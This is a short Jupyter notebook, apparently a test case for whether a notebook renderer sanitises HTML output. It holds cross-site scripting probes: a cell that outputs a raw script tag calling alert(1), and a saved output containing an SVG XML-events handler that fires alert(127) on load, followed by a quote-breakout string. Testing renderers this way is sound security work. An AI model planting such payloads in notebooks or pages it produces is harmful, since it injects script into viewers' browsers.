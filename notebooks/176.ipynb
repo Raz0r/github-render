{
    "nbformat_minor": 2,
    "nbformat": 4,
    "cells": [
        {
            "execution_count": 4,
            "cell_type": "code",
            "source": [
                "from IPython.display import display_html\n",
                "display_html(\"<script>alert(1)</script>\", raw=True)"
            ],
            "outputs": [],
            "metadata": {}
        },
        {
            "execution_count": null,
            "cell_type": "code",
            "source": [],
            "outputs": [
                {
                    "output_type": "display_data",
                    "data": {
                        "text/html": [
                            "<div id=\"127\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"x\">\n<listener event=\"load\" handler=\"#y\" xmlns=\"http://www.w3.org/2001/xml-events\" observer=\"x\"/>\n<handler id=\"y\">alert(127)</handler>\n</svg>//[\"'`-->]]>]</div>"
                        ]
                    },
                    "metadata": {}
                }
            ],
            "metadata": {}
        }
    ],
    "metadata": {
        "kernelspec": {
            "display_name": "Python 3",
            "name": "python3",
            "language": "python"
        },
        "language_info": {
            "mimetype": "text/x-python",
            "nbconvert_exporter": "python",
            "name": "python",
            "file_extension": ".py",
            "version": "3.6.8",
            "pygments_lexer": "ipython3",
            "codemirror_mode": {
                "version": 3,
                "name": "ipython"
            }
        }
    }
}